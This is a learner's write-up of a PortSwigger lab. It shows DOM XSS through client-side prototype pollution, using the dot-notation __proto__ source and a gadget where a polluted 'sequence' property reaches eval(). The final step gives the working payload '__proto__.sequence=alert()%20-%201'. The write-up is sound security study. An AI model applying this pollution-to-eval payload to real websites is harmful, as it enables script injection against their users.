# Lab 3: DOM XSS via an alternative prototype pollution vector

**Platform:** PortSwigger Web Security Academy

**Category:** Prototype Pollution (PRACTITIONER)

<img width="1047" height="241" alt="image" src="https://github.com/user-attachments/assets/0fd08869-5fd3-445a-b37f-dc1b4e29d35e" />


## Lab Description

This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

- Find a source that you can use to add arbitrary properties to the global Object.prototype.

- Identify a gadget property that allows you to execute arbitrary JavaScript.

- Combine these to call alert().

## Steps

### 1. Finding the Prototype Pollution Source

First, I tested whether I could pollute `Object.prototype`.

This time, instead of using the usual __proto__ syntax, I used the alternative prototype pollution vector:

```
__proto__.test=test
```

The `__proto__` parameter is processed by the application in a way that allows us to add properties to the global `Object.prototype`.

After sending the payload, I confirmed that the test property had been added to the prototype.

### 2. Finding the Gadget

Next, I inspected the JavaScript files loaded by the website.

I found an interesting function inside searchLogger:

```
async function searchLogger() {
    window.macros = {};
    window.manager = {
        params: $.parseParams(new URL(location)),
        macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }
    };

    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}
```

The interesting properties here are:

```text 
manager.sequence
```

and:

```text 
manager.macro()
```

The macro property is protected because the function checks:

```
window.macros.hasOwnProperty(property)
```

So instead, I focused on the sequence property.

### 3. Polluting the sequence Property

I tried to pollute:

```text 
__proto__.sequence=alert()
```

This effectively adds a sequence property to the prototype.

While debugging the application, I placed a breakpoint around:

```js 
window.manager = {
    params: $.parseParams(new URL(location)),
    macro(property) {
        // ...
    }
};
```

Then I followed the execution flow and noticed an important detail:

```
let a = manager.sequence || 1;
manager.sequence = a + 1;
```

Because manager inherits the polluted sequence property, our value is used here.

However, there is a problem.

If we use:

```
__proto__.sequence=alert()
```

the application does:

```js 
manager.sequence = alert() + 1;
```

So the resulting expression passed to eval() does not execute alert() as expected.

### 4. Bypassing the + 1

I needed to make the + 1 operation cancel itself out.

I supplied the reverse operation:

```
- 1
```

This gives us:

```
alert() - 1
```

I also needed to add a space so that the generated JavaScript would be parsed correctly.

Therefore, the final payload was:

```text 
__proto__.sequence=alert()%20-%201
```

After URL decoding, the value is:

``` 
alert() - 1 
```

The application then appends its own + 1, resulting in an expression that allows the alert() call to be evaluated.

The important idea is that we are not trying to prevent the application's + 1.

Instead, we **neutralize its effect** by injecting - 1 before it.

### 5. Exploiting the Gadget

The final payload was:

```text 
__proto__.sequence=alert()%20-%201
```

Voilaaaa!!

The alert appeared and the lab was solved.


#

**Lab Link:** [Open the lab](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)

See you in the next lab solution, In sha Allah!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
